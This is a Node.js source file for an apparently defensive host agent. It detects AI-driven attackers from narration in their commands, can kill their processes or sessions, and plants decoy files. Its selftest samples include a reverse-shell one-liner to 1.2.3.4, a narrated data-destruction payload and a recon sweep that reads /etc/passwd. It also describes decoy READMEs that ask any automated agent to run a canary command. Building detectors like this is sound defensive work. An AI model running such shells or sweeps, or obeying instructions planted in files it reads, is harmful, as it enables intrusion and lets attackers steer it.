#!/usr/bin/env node
// Aris Sentinel — resident on-box agent (plain Node >=18, no deps).
//
// The "install and wait" product: taps process execs via Falco (eBPF), scores each
// for the agentic-narration signature with the two-tier brain (sentinel-core.mjs),
// and on a BLOCK verdict KILLS the offending process tree — stopping the attacker's
// AI at its first narrated action, before the destructive step.
//
//   sudo node sentinel-agent.mjs              # MONITOR (default) — detect + alert, no kill
//   sudo node sentinel-agent.mjs --enforce    # ENFORCE — kill the attack on detection
//   sudo node sentinel-agent.mjs --enforce --kill-session
//                                             # …and end the attacker's whole SESSION: every
//                                             # process sharing the offender's session id is
//                                             # killed, and the session is quarantined (what it
//                                             # spawns next is killed too) for 10 minutes
//   sudo node sentinel-agent.mjs --tripwire   # (any mode) plant decoys whose README asks an
//                                             # agent to run one canary command; running it is
//                                             # a conviction, looking at the decoy is an alert
//   sudo node sentinel-agent.mjs --tripwire-remove   # take the decoys away again, then exit
//   sudo node sentinel-agent.mjs --behavior   # (any mode) report a session that asks about many
//                                             # areas of the host in a few minutes (who am I, what
//                                             # runs here, the accounts, sudo rights): alert only
//   node sentinel-agent.mjs --selftest        # score sample payloads, no Falco/root
//
//   env: ANTHROPIC_API_KEY (tier 2 on Claude), OPENAI_BASE_URL+OPENAI_MODEL (local judge),
//        OPENAI_API_KEY, KIMI_API_KEY; ARIS_TIER2_ORDER picks the chain order
//        ARIS_RULES (falco rules path)      FALCO_BIN (default: falco)
//        ARIS_INCIDENTS (incident log path) ARIS_VERBOSE=1 (log every allow too)
//        ARIS_CLOUD_URL + ARIS_INGEST_KEY (off-box alerts)
//        ARIS_FAIL_MODE=alert (page instead of block when tier-2 errors/refuses)
//        ARIS_TRIPWIRE_STATE (where the tripwire token is kept, 0600)
//        ARIS_TRIPWIRE_DIRS (comma-separated decoy directories)
//        ARIS_BEHAVIOR_WINDOW_MS (the --behavior window, default 300000)
//        ARIS_TIER2_TIMEOUT_MS / _DEADLINE_MS / _CACHE_TTL_MS / _CONCURRENCY / _BUDGET_PER_MIN
//
// Decisions (see sentinel-core.mjs):
//   Each exec is judged alone AND as part of its session (proc.sid): narration spread
//   thin across several execs goes to the judge as one transcript (ARIS_SESSION_TTL_MS=0
//   turns that off). Session evidence can alert or, with a judge, block — never tier-1 kill.
//   block → MONITOR: logged + reported.  ENFORCE: killed (unless protected).
//   alert → logged + reported, NEVER killed (tier-2 unavailable / budget spent).
//   error → the detector threw: logged + reported as an incident, never dropped silently.
//   With --tripwire: the canary command executed → block (the one conviction that needs no
//   narration and no judge); the decoy merely addressed → alert.
//   With --behavior: a session that asks about enough areas of the host inside one window
//   (who am I, what runs here, the account database, what may I run as root…) → alert.
//   A look, not an act: never a kill, in any mode.

import { spawn } from "node:child_process";
import { readFileSync, appendFileSync, readdirSync, statSync } from "node:fs";
import { basename, isAbsolute, resolve as resolvePath } from "node:path";
import { hostname } from "node:os";
import { createInterface } from "node:readline";
import { pathToFileURL } from "node:url";
import { armTripwire, BEHAVIOR, behaviorCategories, createBehaviorTracker, createTripwire, decide, decideSession, defaultSessions, disarmTripwire, hasTier2, newTripwireToken, providers, providerWarnings, tripwireDecoy } from "./sentinel-core.mjs";

// SAFE BY DEFAULT: the agent detects + alerts + logs but NEVER kills unless you pass
// --enforce. A false positive can't take down a customer's prod on day one; you flip
// to --enforce only once you trust it on that box. (--dry-run is accepted as an alias
// for the default monitor mode.)
const ENFORCE = process.argv.includes("--enforce");
// SESSION KILL is a second, separate opt-in on top of --enforce. Killing one process tree
// leaves an agent's driver (the shell or exploited server issuing the commands) alive to
// send the next one. With --kill-session a conviction ends every process in the offender's
// session and quarantines that session id, so a silent follow-up (`ls`, `curl`) dies too.
// It is ignored without --enforce, never fires on an `alert`, never touches a protected
// process, and never touches the agent's own session.
const KILL_SESSION = process.argv.includes("--kill-session");
const QUARANTINE_MS = (() => { const n = Number(process.env.ARIS_SESSION_QUARANTINE_MS ?? 600_000); return Number.isFinite(n) && n >= 0 ? n : 600_000; })();
// TRIPWIRE is its own opt-in and works in every mode. It plants a decoy directory whose
// README asks any automated agent to run one command carrying a per-host random token.
// That command executing is a block (killed only in --enforce, like every block); a command
// that merely addresses the decoy is an alert. See the core for the policy.
const TRIPWIRE = process.argv.includes("--tripwire");
const TRIPWIRE_REMOVE = process.argv.includes("--tripwire-remove");
const TRIPWIRE_STATE = process.env.ARIS_TRIPWIRE_STATE || "/var/lib/aris-sentinel/tripwire.json";
const TRIPWIRE_DIRS = (process.env.ARIS_TRIPWIRE_DIRS || "").split(",").map((s) => s.trim()).filter(Boolean);
// BEHAVIOR: opt-in, any mode. A session that sweeps the host is reported, never killed.
const BEHAVIOR_ON = process.argv.includes("--behavior");
const SELFTEST = process.argv.includes("--selftest");
const VERBOSE = process.env.ARIS_VERBOSE === "1";
const FALCO_BIN = process.env.FALCO_BIN || "falco";
const RULES = process.env.ARIS_RULES || "/home/ubuntu/aris_rules.yaml";
const INCIDENT_LOG = process.env.ARIS_INCIDENTS || "/var/log/aris-incidents.jsonl";
// Off-box reporting -> Aris Cloud. The box may be compromised, so the alert must
// egress to a place the attacker can't reach. ARIS_CLOUD_URL is the base
// (e.g. https://youraris.com); we POST incidents to /api/local/sentinel/alert.
const CLOUD_URL = process.env.ARIS_CLOUD_URL;
const CLOUD_KEY = process.env.ARIS_INGEST_KEY || "";
const HOST = process.env.ARIS_HOST || hostname();
const OWN_PID = process.pid;
const MAX_PAYLOAD = 256 * 1024;

// Blend in. A generic process title means ps/top show a mundane daemon, not a
// security tool — so an attacker's recon has nothing obvious to target, and an
// autonomous attacker (not trained to know what Aris is) can't confidently kill it.
try { process.title = process.env.ARIS_PROC_NAME || "sys-telemetryd"; } catch {}

// Never kill these (nor their ancestors): system-critical + our own toolchain.
const PROTECTED_COMMS = new Set([
  "systemd", "init", "sshd", "falco", "node", "containerd", "dockerd", "docker",
  "containerd-shim", "containerd-shim-runc-v2", "runc", "dbus-daemon", "cron",
  "agetty", "login", "sudo", "su", "snapd", "systemd-journal", "systemd-journald",
  "systemd-logind", "systemd-resolve", "polkitd", "unattended-upgr", "packagekitd",
]);
// Interpreters whose script-file argument we read (the narration usually lives in the
// file, not the cmdline), and the single-letter flags that mean "the code is inline
// in the cmdline" — then there is no script file to read. Combined flag groups count
// (`bash -lc`, `python3 -Bc`, `perl -ne`).
const INLINE_LETTERS = { python: "c", shell: "c", node: "ep", perl: "eE", ruby: "e", php: "r" };
// Options that take the NEXT token as their value, per family. That token is never the
// script (`python3 -W ignore job.py`, `bash -o pipefail run.sh`, `node -r ./hook.js app.js`).
const VALUE_OPTS = {
  python: ["-W", "-X", "-Q", "--check-hash-based-pycs"],
  shell: ["-o", "+o", "-O", "+O", "--rcfile", "--init-file"],
  node: ["-r", "--require", "--import", "--loader", "--experimental-loader", "-C", "--conditions", "--env-file", "--title"],
  perl: ["-I", "-x"],
  ruby: ["-r", "-I", "-C", "-E", "-K"],
  php: ["-d", "-c", "-z"],
};

/** The interpreter family for an executable name (`python3.12` → python), or null. */
export function interpreterOf(exe) {
  const e = String(exe || "");
  if (/^python[\d.]*$/.test(e)) return "python";
  if (/^(bash|sh|dash|zsh)$/.test(e)) return "shell";
  if (/^node(js)?[\d.]*$/.test(e)) return "node";
  if (/^perl[\d.]*$/.test(e)) return "perl";
  if (/^ruby[\d.]*$/.test(e)) return "ruby";
  if (/^php[\d.]*$/.test(e)) return "php";
  return null;
}
const LONG_INLINE = new Set(["--eval", "--print", "--command", "--exec"]);

const now = () => new Date().toISOString();
const log = (m) => console.log(`[${now()}] ${m}`);

// ── /proc helpers (no shelling out — avoids exec feedback loops) ──────────────
function procStatus(pid) {
  try {
    const s = readFileSync(`/proc/${pid}/status`, "utf8");
    const name = (s.match(/^Name:\t(.*)$/m) || [])[1] || "";
    const ppid = Number((s.match(/^PPid:\t(\d+)$/m) || [])[1] || 0);
    return { name, ppid };
  } catch { return null; }
}
/** The session id out of a /proc/<pid>/stat line. comm may contain spaces and parens. */
export function parseStatSid(stat) {
  const rest = String(stat).slice(String(stat).lastIndexOf(")") + 2).split(" "); // state ppid pgrp session …
  const sid = Number(rest[3]);
  return Number.isInteger(sid) ? sid : null;
}
function procSid(pid) {
  try { return parseStatSid(readFileSync(`/proc/${pid}/stat`, "utf8")); } catch { return null; }
}
/** Every live pid whose session id is `sid`. */
function sessionPids(sid) {
  const out = [];
  let entries = [];
  try { entries = readdirSync("/proc"); } catch { return out; }
  for (const e of entries) {
    if (!/^\d+$/.test(e)) continue;
    if (procSid(Number(e)) === sid) out.push(Number(e));
  }
  return out;
}
function ancestorsOf(pid) {
  const set = new Set();
  let cur = pid, guard = 0;
  while (cur > 1 && guard++ < 64) {
    const st = procStatus(cur);
    if (!st) break;
    set.add(cur);
    cur = st.ppid;
  }
  return set;
}
function descendantsOf(pid) {
  // build ppid->children map from /proc, BFS down
  const kids = new Map();
  for (const e of readdirSync("/proc")) {
    if (!/^\d+$/.test(e)) continue;
    const st = procStatus(Number(e));
    if (st) (kids.get(st.ppid) || kids.set(st.ppid, []).get(st.ppid)).push(Number(e));
  }
  const out = [], q = [pid];
  while (q.length) {
    const p = q.shift();
    for (const c of kids.get(p) || []) { out.push(c); q.push(c); }
  }
  return out;
}

function killTree(pid) {
  const kids = descendantsOf(pid);
  // deepest first, then the root pid last
  for (const p of [...kids.reverse(), pid]) {
    try { process.kill(p, "SIGKILL"); } catch {}
  }
  return [pid, ...kids];
}

// ── payload extraction: cmdline + (for interpreters) the script file content ──

/** True when the interpreter is running inline code (`-c`, `-e`, `-lc`, `--eval`…). */
export function hasInlineCode(exe, args) {
  const letters = INLINE_LETTERS[interpreterOf(exe)];
  if (letters === undefined) return false;
  for (const a of args) {
    if (LONG_INLINE.has(a)) return true;
    if (/^-[^-]/.test(a) && [...letters].some((l) => a.slice(1).includes(l))) return true;
  }
  return false;
}

/**
 * Which argument is the script the interpreter will run? Only the FIRST positional
 * argument can be. Everything after it is the script's own data, and the agent must not
 * read data as if it were code: `python3 -m json.tool incidents.jsonl` and
 * `python3 - notes.txt` run no file at all, and `python3 report.py attack-writeup.md`
 * runs report.py, not the write-up. Returns the token, or null when there is no script
 * file (module run, stdin, or no positional).
 */
export function scriptToken(exe, args) {
  const fam = interpreterOf(exe);
  if (!fam) return null;
  const valued = new Set(VALUE_OPTS[fam]);
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === "-") return null; // the program comes from stdin
    if (a === "--") return args[i + 1] ?? null;
    if (fam === "php" && a === "-f") return args[i + 1] ?? null;
    const isOpt = a.startsWith("-") || (fam === "shell" && a.startsWith("+"));
    if (!isOpt) return a;
    if (fam === "python" && /^-[A-Za-z]*m$/.test(a)) return null; // -m <module>: no script file
    if (valued.has(a) || (/^-[A-Za-z]{2,}$/.test(a) && valued.has("-" + a.slice(-1)))) i++; // skip the option's value
  }
  return null;
}

/**
 * Resolve a script token against the PROCESS's cwd — never the agent's own. Falco
 * gives us %proc.cwd; if it's missing, /proc/<pid>/cwd is the kernel's answer. With
 * neither, a relative path is unresolvable and we don't guess.
 */
export function resolveScript(tok, { cwd, pid } = {}) {
  if (isAbsolute(tok)) return tok;
  if (cwd && isAbsolute(cwd)) return resolvePath(cwd, tok);
  if (pid) return `/proc/${pid}/cwd/${tok}`;
  return null;
}

function readScript(path) {
  try {
    if (!statSync(path).isFile()) return null;
    return readFileSync(path, "utf8").slice(0, MAX_PAYLOAD);
  } catch { return null; }
}

export function extractPayload(f) {
  const cmdline = f["proc.cmdline"] || "";
  const exe = basename(f["proc.exe"] || "");
  const pieces = [cmdline];
  const args = cmdline.split(/\s+/).filter(Boolean);
  // Read the script file ONLY when the interpreter is actually running a script
  // (`python3 foo.py`). Skip inline-code forms — the code is already in the cmdline,
  // and a token that merely MENTIONS another script's path (e.g. a shell command
  // referencing it) must not cause us to slurp+score that unrelated file.
  // And read ONLY the script: the first positional argument. Later arguments are data.
  // (Scanning for "the first argument that is a file" once made the agent read its own
  // incident log, which quotes attackers, and convict whoever was reading it.)
  if (interpreterOf(exe) && !hasInlineCode(exe, args.slice(1))) {
    const tok = scriptToken(exe, args.slice(1));
    const path = tok && resolveScript(tok, { cwd: f["proc.cwd"], pid: Number(f["proc.pid"]) || 0 });
    // Never our own incident log, however it is invoked: it is evidence, not code.
    const text = path && resolvePath(path) !== resolvePath(INCIDENT_LOG) ? readScript(path) : null;
    if (text !== null && text !== undefined) pieces.push(text);
  }
  return pieces.join("\n").slice(0, MAX_PAYLOAD);
}

// Per-(session, payload) dedup: one attack fans out into several execs, so without
// this the same payload is adjudicated (and logged, and billed) N times. Cache the
// key SYNCHRONOUSLY before the async decide(), so concurrent duplicate events collapse
// to a single tier-2 call and a single clean log line. killTree already covers the tree.
const decided = new Map();
const DEDUP_MAX = 4000;
const DEDUP_WINDOW_MS = 15_000; // collapse one launch's exec fan-out; re-catch a later re-run
function hash(s) { let h = 5381; for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0; return h >>> 0; }

// ── response ─────────────────────────────────────────────────────────────────
const selfAncestors = ancestorsOf(OWN_PID);

function isProtected(pid, comm) {
  if (pid <= 1) return "pid<=1";
  if (pid === OWN_PID) return "self";
  if (selfAncestors.has(pid)) return "agent-ancestor";
  if (PROTECTED_COMMS.has(comm)) return `protected-comm:${comm}`;
  return null;
}

// The attacker's own words — the comment/narration lines from the payload. This is
// the product superpower: the alert can say what the enemy AI was TRYING to do.
function narrationSnippet(payload) {
  const lines = payload.split("\n").map((l) => l.trim());
  const narrated = lines.filter((l) => /^(#|\/\/|--|\*)/.test(l) || /\bI (will|need to|am|have|'ll)\b/i.test(l));
  const text = (narrated.length ? narrated : lines.filter(Boolean)).join(" ").replace(/^[#/*\-\s]+/gm, "").trim();
  return text.slice(0, 600);
}

// Fire-and-forget report to Aris Cloud. Called BEFORE the kill so the alert is already
// in flight even if terminating the process triggers attacker retaliation. Never throws.
function reportToCloud(incident) {
  if (!CLOUD_URL) return;
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), 5000);
  fetch(`${CLOUD_URL}/api/local/sentinel/alert`, {
    method: "POST",
    headers: { "content-type": "application/json", "x-aris-key": CLOUD_KEY },
    body: JSON.stringify(incident),
    signal: ctl.signal,
  }).then((r) => { if (!r.ok) log(`cloud alert failed: HTTP ${r.status}`); })
    .catch((e) => log(`cloud alert error: ${e.name === "AbortError" ? "timeout" : e.message}`))
    .finally(() => clearTimeout(t));
}

function writeIncident(incident) {
  try { appendFileSync(INCIDENT_LOG, JSON.stringify(incident) + "\n"); } catch (e) { log(`incident log write failed: ${e.message}`); }
}

// The tripwire token must never reach a log line or an incident: an operator who later
// greps the incident log for it would be running a command that carries it.
const clean = (s) => (deps.tripwire && typeof s === "string" ? deps.tripwire.redact(s) : s);

function procFields(f) {
  const comm = basename(f["proc.exe"] || f["proc.pname"] || "");
  return {
    pid: Number(f["proc.pid"]), ppid: Number(f["proc.ppid"]), sid: Number(f["proc.sid"]),
    user: f["user.name"], exe: comm, cwd: f["proc.cwd"] ?? null, cmdline: clean(f["proc.cmdline"]),
  };
}

function respond(f, d, payload) {
  const p = procFields(f);
  const how = d.tier === 2 ? (d.adjudication?.refused ? "fail-closed" : `conf=${d.adjudication?.confidence?.toFixed(2)}`) : "";
  const decoded = d.decoded ? " (decoded)" : "";
  const sess = d.viaSession ? `  via-session(${d.session.size} payloads)` : "";

  // `alert` is never a kill: tier 2 could not judge it, so we page a human instead.
  const guard = d.decision === "block" ? isProtected(p.pid, p.exe) : null;
  const action =
    d.decision === "alert" ? (d.viaTripwire ? "ALERT (decoy addressed, not run — no kill)" : d.viaBehavior ? "ALERT (the session swept the host — no kill)" : "ALERT (tier-2 unavailable — no kill)")
    : !deps.mode.enforce ? "DETECTED (monitor — no kill)"
    : guard ? `SPARED (${guard})`
    : "KILL";
  log(`SENTINEL ${action}  ${d.viaTripwire ? "tripwire" : d.viaBehavior ? "behavior" : `tier-${d.tier}`}  pid=${p.pid} ppid=${p.ppid} sid=${p.sid} user=${p.user} exe=${p.exe}${decoded}${sess}  score=${d.score.toFixed(2)}${how ? " " + how : ""}`);
  log(`            cmd: ${(p.cmdline || "").slice(0, 200)}`);
  if (d.reason) log(`            ${d.reason}`);
  if (d.adjudication?.reasoning) log(`            reasoning: ${d.adjudication.reasoning}`);

  const base = {
    host: HOST, ts: now(), decision: d.decision, tier: d.tier,
    action: d.decision === "alert" ? "alerted" : !deps.mode.enforce ? "monitored" : guard ? `spared:${guard}` : "killed",
    ...p, score: d.score, signals: d.signals, reason: d.reason,
    conf: d.adjudication?.confidence ?? null, reasoning: d.adjudication?.reasoning ?? null,
    // When the session convicted, the evidence is the session's words, not this one exec's.
    // And for a long script the evidence is the window that fired, not its licence header.
    narration: clean(narrationSnippet(d.viaSession || d.windowed ? d.scoredLayer : payload)),
    via_session: !!d.viaSession, session: d.session ?? null,
    // kind "token": the canary command ran. kind "decoy": the decoy was addressed. Never the token itself.
    tripwire: d.tripwire ?? null,
    // kind "sweep": which areas of the host the session asked about, and how fast. Area names only.
    behavior: d.behavior ?? null,
  };

  // Egress the alert to Aris Cloud FIRST — before we touch the process.
  reportToCloud(base);

  // Session kill: only on a conviction, only when armed twice (--enforce --kill-session).
  // It runs even when the offending process itself was spared (a protected interpreter can
  // still be the door an agent is walking through); each member faces the same guard.
  //
  // ORDER MATTERS, and the session goes FIRST. The shell that launched the offender is
  // blocked waiting for it; killing the offender first is what wakes that shell up, and it
  // ran its next command in the milliseconds before the session kill reached it (found
  // live on 2026-11-10, with both a narrated attacker and the tripwire). So: the rest of
  // the session dies while the offender still holds it, the offender's tree dies last.
  const armed = deps.mode.enforce && d.decision === "block";
  let sessionKill = null;
  if (armed && deps.mode.killSession) {
    sessionKill = killSession(p.sid, guard ? new Set() : new Set([p.pid]), p.pid);
    if (sessionKill.why) log(`            session ${p.sid}: not killed (${sessionKill.why})`);
    else log(`            SESSION KILL sid=${p.sid}: killed ${sessionKill.killed.length} more process(es)${sessionKill.spared.length ? `, spared ${sessionKill.spared.map((x) => `${x.pid}(${x.why})`).join(" ")}` : ""}; quarantined for ${Math.round(QUARANTINE_MS / 1000)}s`);
  }

  let killed = [];
  if (armed && !guard) killed = deps.killTree(p.pid);
  if (sessionKill && !sessionKill.why) killed = [...new Set([...killed, ...sessionKill.killed])];

  writeIncident({ ...base, tier2: d.adjudication || null, killed, session_kill: sessionKill });
}

// ── session kill + quarantine ────────────────────────────────────────────────
// The sessions the agent itself lives in: its own, and those of its ancestors (the shell
// or service manager that started it). Ending one of those would be the agent cutting
// off its own operator, so a session kill never touches them. Under systemd this is just
// the agent's own session; started by hand it is also the terminal it was started from.
const OWN_SIDS = new Set([...selfAncestors].map(procSid).filter((n) => n !== null));
const quarantined = new Map(); // sid -> { until, since, count }

/**
 * Kill every process in session `sid` that the guard allows (`skip` excepted: the offender,
 * whose tree the caller kills right after), then quarantine the sid.
 * The offender's ancestors go first, outermost first: each of them is waiting on the one
 * below it, so killing from the top down never wakes a process up to run one more command.
 */
function killSession(sid, skip, offender) {
  const out = { sid, killed: [], spared: [], why: null };
  if (!(Number.isInteger(sid) && sid > 1)) return { ...out, why: "no session id" };
  if (deps.ownSids.has(sid)) return { ...out, why: "the session the agent runs in or was started from" };
  const up = offender ? deps.ancestorsOf(offender) : []; // [offender, parent, grandparent, …]
  const rank = new Map(up.map((pid, i) => [pid, i + 1]));
  const members = [...deps.sessionPids(sid)].sort((a, b) => (rank.get(b) ?? 0) - (rank.get(a) ?? 0)); // stable: the rest keep their order
  for (const pid of members) {
    if (skip.has(pid)) continue;
    const guard = isProtected(pid, deps.procName(pid));
    if (guard) { out.spared.push({ pid, why: guard }); continue; }
    try { deps.killPid(pid); out.killed.push(pid); } catch {}
  }
  if (QUARANTINE_MS > 0) {
    quarantined.set(sid, { until: deps.now() + QUARANTINE_MS, since: now(), count: 0 });
    while (quarantined.size > 500) quarantined.delete(quarantined.keys().next().value);
  }
  return out;
}

// An exec inside a quarantined session is stopped without being scored: the session was
// convicted, and a silent command from it is the attacker's next step, not evidence to
// weigh. The protected-process guard still applies. Returns true when it handled the event.
function quarantine(f) {
  if (!deps.mode.enforce || !deps.mode.killSession) return false;
  const sid = Number(f["proc.sid"]);
  const q = quarantined.get(sid);
  if (!q) return false;
  if (deps.now() >= q.until) { quarantined.delete(sid); return false; }
  const p = procFields(f);
  const guard = isProtected(p.pid, p.exe);
  q.count++;
  log(`SENTINEL ${guard ? `SPARED (${guard})` : "KILL"}  quarantined-session  pid=${p.pid} ppid=${p.ppid} sid=${p.sid} user=${p.user} exe=${p.exe}`);
  log(`            cmd: ${(p.cmdline || "").slice(0, 200)}`);
  const incident = {
    host: HOST, ts: now(), decision: "block", tier: null,
    action: guard ? `spared:${guard}` : "killed", ...p, score: null, signals: [],
    reason: `exec in a session convicted at ${q.since}; quarantined until ${new Date(q.until).toISOString()}`,
    conf: null, reasoning: null, narration: "", via_session: false, session: null, quarantine: { sid, since: q.since, count: q.count },
  };
  if (q.count === 1) reportToCloud(incident); // one off-box report per quarantined session, not one per exec
  const killed = guard ? [] : deps.killTree(p.pid);
  writeIncident({ ...incident, tier2: null, killed, session_kill: null });
  return true;
}

// A detector exception must never become a silent allow. It is logged, written as an
// incident with decision "error", and reported off-box, so a crash on the one payload
// that matters is visible — and, if an attacker found a way to crash the scorer, that
// in itself is the alarm. Nothing is killed on an error (the verdict is unknown).
function respondError(f, e, payload) {
  const p = procFields(f);
  const error = String(e && e.stack ? e.stack : e).slice(0, 2000);
  log(`SENTINEL ERROR  detector threw on pid=${p.pid} exe=${p.exe}: ${String(e && e.message ? e.message : e).slice(0, 200)}`);
  const incident = {
    host: HOST, ts: now(), decision: "error", tier: null, action: "errored",
    ...p, score: null, signals: [], reason: "detector exception — payload not judged", error,
    conf: null, reasoning: null, narration: clean(narrationSnippet(payload)),
  };
  reportToCloud(incident);
  writeIncident(incident);
}

// The session a process belongs to: its session id (setsid leader). An agent driving a
// shell, or the children of one exploited server, share it. Unknown / pid-1 sids get no
// session (the payload is judged alone).
export const sessionKeyOf = (f) => {
  const sid = Number(f["proc.sid"]);
  return Number.isInteger(sid) && sid > 1 ? `sid:${sid}` : null;
};

// Injectable seams for tests (swap `deps.decide` to simulate a throwing detector).
// `mode` is what the process was started with; the kill primitives are real /proc + SIGKILL.
// `tripwire` is this host's matcher once main() has armed it (null otherwise); `behavior`
// is the session-behavior tracker once main() has turned it on (null otherwise).
export const deps = {
  decide: (payload, sessionKey, ctx = {}) => decideSession(sessionKey, payload, { tripwire: deps.tripwire, cwd: ctx.cwd, behavior: deps.behavior, command: ctx.command }),
  tripwire: null,
  behavior: null,
  mode: { enforce: ENFORCE, killSession: ENFORCE && KILL_SESSION },
  killTree,
  sessionPids,
  ancestorsOf: (pid) => [...ancestorsOf(pid)], // [pid, parent, grandparent, …] from /proc
  procName: (pid) => procStatus(pid)?.name ?? "",
  killPid: (pid) => process.kill(pid, "SIGKILL"),
  ownSids: OWN_SIDS,
  now: () => Date.now(),
};

// ── event handling ───────────────────────────────────────────────────────────
export async function handleEvent(f) {
  const pid = Number(f["proc.pid"]);
  if (!pid || pid === OWN_PID) return;
  if (quarantine(f)) return; // a convicted session's next exec: stopped, not scored
  const payload = extractPayload(f);
  // Too short to narrate anything. With --behavior on, `id` and `w` are exactly the
  // commands a sweep is made of, so only an empty payload is skipped.
  if (payload.trim().length < (deps.behavior ? 1 : 3)) return;

  // collapse duplicate execs of the same attack (same session + same payload) so we
  // adjudicate once. Set the key BEFORE awaiting so concurrent events don't race in.
  const key = `${f["proc.sid"]}:${hash(payload)}`;
  const prev = decided.get(key);
  if (prev && Date.now() - prev < DEDUP_WINDOW_MS) return;
  decided.set(key, Date.now());
  if (decided.size > DEDUP_MAX) decided.delete(decided.keys().next().value);

  let d;
  // Behavior reads the command line alone: the script file appended for the narration
  // scorer is text the session may never run, and its own commands arrive as their own execs.
  try { d = await deps.decide(payload, sessionKeyOf(f), { cwd: f["proc.cwd"], command: f["proc.cmdline"] || "" }); } catch (e) { return respondError(f, e, payload); }
  if (d.decision === "block" || d.decision === "alert") return respond(f, d, payload);
  // With --behavior the verbose line also says which areas of the host the command asked
  // about, so an operator can see what a session's window holds before it is ever reported.
  if (VERBOSE) log(`allow  tier-${d.tier}  pid=${pid} sid=${f["proc.sid"]} exe=${basename(f["proc.exe"] || "")}  score=${d.score.toFixed(2)}${deps.behavior ? `  areas=[${behaviorCategories(f["proc.cmdline"] || "").join(",")}]` : ""}  ${d.reason}`);
  return d;
}

// ── selftest: score sample payloads, no Falco/root/kill ──────────────────────
async function selftest() {
  log("SELFTEST — scoring sample execs (no Falco, no kill)\n");
  const samples = [
    { name: "narrated agent (expect BLOCK)", cmdline: `python3 -c # Phase 4 Impact. I have ranked the databases by value. High-ROI targets to drop, data already backed up to my exfil host. I will proceed to maximize pressure on the victim.` },
    { name: "benign command (expect allow)", cmdline: `python3 manage.py migrate --noinput` },
    { name: "terse malware (expect allow, tier-1 only)", cmdline: `bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` },
  ];
  // A throwaway tripwire (nothing is planted): the decoy's own command, then a look at the decoy.
  const token = newTripwireToken();
  const tripwire = createTripwire({ token, dirs: ["/opt/vault-access"] });
  samples.push(
    { name: "tripwire: the decoy's canary command executed (expect BLOCK)", cmdline: tripwireDecoy(token, "/opt/vault-access", "linux").command },
    { name: "tripwire: the decoy read, not run (expect ALERT)", cmdline: "cat /opt/vault-access/README.md" },
  );
  for (const s of samples) {
    const d = await decide(extractPayload({ "proc.cmdline": s.cmdline, "proc.exe": s.cmdline.split(" ")[0] }), { tripwire });
    log(`[${d.decision.toUpperCase().padEnd(5)}] ${d.viaTripwire ? "tripwire" : `tier-${d.tier}`} score=${d.score.toFixed(2)}  ${s.name}`);
    log(`         signals=[${d.signals.join(", ")}]  ${d.reason}\n`);
  }
  // Session behavior: one quiet session asks who it is, what the box is, what runs on it,
  // who has an account and what it may run as root. No command narrates anything; the
  // command that completes the sweep is the one reported.
  const behavior = createBehaviorTracker();
  const sweep = ["id", "uname -a", "ps aux", "ss -tlnp", "cat /etc/passwd", "sudo -n -l"];
  for (const [i, cmdline] of sweep.entries()) {
    const d = await decideSession("selftest", cmdline, { behavior });
    const last = i === sweep.length - 1;
    log(`[${d.decision.toUpperCase().padEnd(5)}] ${d.viaBehavior ? "behavior" : `tier-${d.tier}`} score=${d.score.toFixed(2)}  behavior: quiet sweep, command ${i + 1}/${sweep.length} \`${cmdline}\` (expect ${last ? "ALERT" : "allow"})`);
    if (d.viaBehavior) log(`         signals=[${d.signals.join(", ")}]  ${d.reason}\n`);
  }
  log("selftest done. Arm with: sudo node sentinel-agent.mjs");
}

// ── main ─────────────────────────────────────────────────────────────────────
function main() {
  log(`Aris Sentinel agent starting`);
  log(`  mode: ${ENFORCE ? "ENFORCE (kills the attack on detection)" : "MONITOR (detect + alert only — no kill; pass --enforce to arm)"}`);
  log(`  session kill: ${ENFORCE && KILL_SESSION ? `ON (a conviction ends the offender's whole session and quarantines it for ${Math.round(QUARANTINE_MS / 1000)}s)` : KILL_SESSION ? "IGNORED (--kill-session does nothing without --enforce)" : "off (pass --kill-session with --enforce)"}`);
  log(`  tier 2: ${hasTier2() ? `ENABLED (${providers().map((p) => p.name).join(" -> ")})` : "disabled (tier-1 only; set ANTHROPIC_API_KEY, or OPENAI_BASE_URL+OPENAI_MODEL for a local judge) — escalate band -> alert"}`);
  for (const w of providerWarnings()) log(`  WARN ${w}`);
  log(`  fail mode: ${process.env.ARIS_FAIL_MODE === "alert" ? "alert (tier-2 errors page, never block)" : "closed (tier-2 errors block as suspicious)"}`);
  log(`  session evidence: ${defaultSessions.enabled ? "ON (narration accumulated per proc.sid; judged as a transcript, never a tier-1 kill)" : "off (ARIS_SESSION_TTL_MS=0)"}`);
  if (TRIPWIRE) {
    const a = armTripwire({ stateFile: TRIPWIRE_STATE, dirs: TRIPWIRE_DIRS });
    deps.tripwire = a.tripwire;
    if (a.error) log(`  tripwire: NOT ARMED (${a.error}) — nothing planted, nothing matched`);
    else log(`  tripwire: ON (${a.created ? "new token" : "existing token"} ${a.tripwire.fingerprint}; decoys: ${a.tripwire.dirs.join(", ") || "none"}) — canary command run -> block, decoy addressed -> alert`);
    for (const s of a.skipped) log(`  WARN tripwire: no decoy at ${s.dir} (${s.why})`);
  } else log(`  tripwire: off (pass --tripwire to plant decoys)`);
  if (BEHAVIOR_ON) {
    deps.behavior = createBehaviorTracker();
    if (!deps.behavior.enabled) log(`  session behavior: OFF (--behavior was passed, but ARIS_BEHAVIOR_WINDOW_MS=0 turns it off)`);
    else log(`  session behavior: ON (a session asking about ${BEHAVIOR.categories}+ areas of the host, ${BEHAVIOR.sensitive}+ of them sensitive, inside ${Math.round(deps.behavior.windowMs / 1000)}s -> alert, never a kill)`);
  } else log(`  session behavior: off (pass --behavior to report sessions that sweep the host)`);
  log(`  cloud alerts: ${CLOUD_URL ? `-> ${CLOUD_URL} (Telegram via Aris Cloud)` : "disabled (set ARIS_CLOUD_URL)"}`);
  log(`  incidents -> ${INCIDENT_LOG}`);

  const falco = spawn(FALCO_BIN, [
    "-r", RULES,
    "-o", "priority=debug", "-o", "json_output=true", "-o", "json_include_output_property=true",
    "-o", "stdout_output.enabled=true", "-o", "log_level=error", "-o", "webserver.enabled=false",
    // Falco defaults to syslog; as our child it lands in our cgroup and floods the
    // journal with a raw JSON line per exec. We consume events via the stdout pipe
    // only — silence every other Falco output sink.
    "-o", "syslog_output.enabled=false", "-o", "file_output.enabled=false",
  ], { stdio: ["ignore", "pipe", "pipe"] });

